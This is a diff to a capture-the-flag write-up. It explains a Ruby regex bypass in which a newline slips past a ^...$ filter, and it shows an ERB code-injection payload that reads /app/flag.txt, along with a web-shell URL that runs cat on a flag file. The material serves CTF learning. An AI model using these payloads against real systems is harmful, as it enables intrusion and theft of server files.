@@ -131,12 +131,12 @@ http://104.248.173.13:32130/lol10.php?cmd=cat%20../flag_d055c3346bc2c02.txt
 
 ## Neofy `Regex Bypass with new line` && `Code Injection`
 Regex that should protect against Code Injection:
-```
-/^[0-9a-z ]+$/
+```ruby
+params[:neon] =~ /^[0-9a-z ]+$/i
 ```
 In Ruby (but not only) the ^ and $ match at the start and end of each line. So if any (!) one line is matching, we have a successful match. What we would rather want in this case is matching the beginning and end of the string, which is possible with \A and \z.
 Thats why this payload works:
-```
+```url
 # In request POST /
 neon=abc%0a<%25%3d+File.open('/app/flag.txt').read+%25>
 %0a -> encoded newline
